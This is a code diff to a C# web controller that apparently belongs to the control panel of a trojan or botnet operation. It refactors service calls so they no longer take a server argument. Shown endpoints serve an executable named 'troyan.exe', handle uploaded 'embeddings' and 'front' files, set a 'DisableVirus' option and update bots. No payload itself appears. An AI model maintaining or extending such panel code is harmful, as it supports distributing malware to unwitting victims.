@@ -36,7 +36,7 @@ public class CpController : BaseController
             return NotFound();
         try
         {
-            var serverResult = _serverService.GetServerHard(server);
+            var serverResult = _serverService.GetServerHard();
             ViewData["UrlDoc"] = serverResult.ServerModel?.UrlDoc != null ? serverResult.ServerModel.UrlDoc : "";
             if (serverResult.ServerModel == null)
                 return NotFound();
@@ -55,9 +55,9 @@ public class CpController : BaseController
         try
         {
             var server = Server;
-            if (!System.IO.File.Exists(_serverService.GetIcon(server)))
+            if (!System.IO.File.Exists(_serverService.GetIconPath()))
                 return NotFound();
-            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetIcon(server));
+            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetIconPath());
             Response.Headers.Add("Content-Type", "image/x-icon");
             return File(fileBytes, "image/x-icon");
         }
@@ -86,7 +86,7 @@ public class CpController : BaseController
     [HttpGet("/GetExe")]
     public IActionResult GetExe()
     {
-        return GetFile(_serverService.GetExe(Server), "troyan.exe");
+        return GetFile(_serverService.GetExePath(), "troyan.exe");
     }
 
     private async Task<IActionResult> GetFileAdvanced(string file, string name, string random, string target, string nofile)
@@ -96,7 +96,7 @@ public class CpController : BaseController
             string fileContent;
             if (!_memoryCache.TryGetValue(file, out fileContent))
             {
-                fileContent = await System.IO.File.ReadAllTextAsync(_serverService.Paths.UserDataFile(Server, file));
+                fileContent = await System.IO.File.ReadAllTextAsync(_serverService.Paths.UserDataFile(file));
                 var cacheEntryOptions = new MemoryCacheEntryOptions()
                     .SetSlidingExpiration(TimeSpan.FromMinutes(1));
                 _memoryCache.Set(file, fileContent, cacheEntryOptions);
@@ -136,7 +136,7 @@ public class CpController : BaseController
         var server = Server;
         try
         {
-            var existingModel = _serverService.GetServerHard(server).ServerModel;
+            var existingModel = _serverService.GetServerHard().ServerModel;
             if (existingModel == null)
             {
                 return NotFound();
@@ -161,9 +161,9 @@ public class CpController : BaseController
             {
                 foreach (var file in newEmbeddings)
                 {
-                    var filePath = _serverService.GetEmbedding(server, file.FileName);
-                    if (!Directory.Exists(_serverService.EmbeddingsDir(server)))
-                        Directory.CreateDirectory(_serverService.EmbeddingsDir(server));
+                    var filePath = _serverService.GetEmbeddingPath(file.FileName);
+                    if (!Directory.Exists(_serverService.EmbeddingsDir))
+                        Directory.CreateDirectory(_serverService.EmbeddingsDir);
                     using (var stream = new FileStream(filePath, FileMode.Create))
                     {
                         file.CopyTo(stream);
@@ -175,16 +175,16 @@ public class CpController : BaseController
 
             var toDeleteEmbeddings = existingModel.Embeddings.Where(a => !updatedModel.Embeddings.Contains(a));
             foreach (var file in toDeleteEmbeddings)
-                _serverService.DeleteEmbedding(server, file);
+                _serverService.DeleteEmbedding(file);
 
 
             if (newFront != null && newFront.Count > 0)
             {
                 foreach (var file in newFront)
                 {
-                    var filePath = _serverService.GetFront(server, file.FileName);
-                    if (!Directory.Exists(_serverService.FrontDir(server)))
-                        Directory.CreateDirectory(_serverService.FrontDir(server));
+                    var filePath = _serverService.GetFrontPath(file.FileName);
+                    if (!Directory.Exists(_serverService.FrontDir))
+                        Directory.CreateDirectory(_serverService.FrontDir);
                     using (var stream = new FileStream(filePath, FileMode.Create))
                     {
                         file.CopyTo(stream);
@@ -196,12 +196,12 @@ public class CpController : BaseController
 
             var toDeleteFront = existingModel.Front.Where(a => !updatedModel.Front.Contains(a));
             foreach (var file in toDeleteFront)
-                _serverService.DeleteFront(server, file);
+                _serverService.DeleteFront(file);
 
 
             if (iconFile != null && iconFile.Length > 0)
             {
-                var filePath = _serverService.GetIcon(server);
+                var filePath = _serverService.GetIconPath();
 
                 using (var stream = new FileStream(filePath, FileMode.Create))
                 {
@@ -264,7 +264,7 @@ public class CpController : BaseController
             existingModel.DisableVirus = updatedModel.DisableVirus;
 
 
-            var result = _serverService.PostServerRequest(server, existingModel, action);
+            var result = _serverService.PostServerRequest(existingModel, action);
             if (result == "OK")
                 _hostsChanged.NotifyHostsChanged();
 
@@ -297,4 +297,4 @@ public class CpController : BaseController
     {
         return _botController.Update(Server);
     }
-    }
+}
